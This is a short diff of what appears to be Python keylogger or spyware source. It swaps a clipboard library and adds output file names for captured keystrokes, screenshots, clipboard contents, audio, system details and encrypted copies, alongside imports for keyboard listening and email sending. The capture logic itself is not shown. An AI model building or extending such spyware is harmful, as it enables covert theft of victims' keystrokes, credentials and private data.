@@ -9,7 +9,7 @@ import smtplib
 import socket
 import platform
 
-import win32clipboard
+import clipboard # Using clipboard instead of win32clipboard
 
 from pynput.keyboard import Key, Listener
 
@@ -27,6 +27,14 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
+system_information = "system.txt"
+audio_information = "audio.wav"
+clipboard_information = "clipboard.txt"
+screenshot_information = "screenshot.png"
 keys_information = "key_log.txt"
+
+system_information_enc = 'enc_system.txt'
+clipboard_information_enc = 'enc_clipboard.txt'
+keys_information_enc = 'enc_keys_logged.txt'
 
 
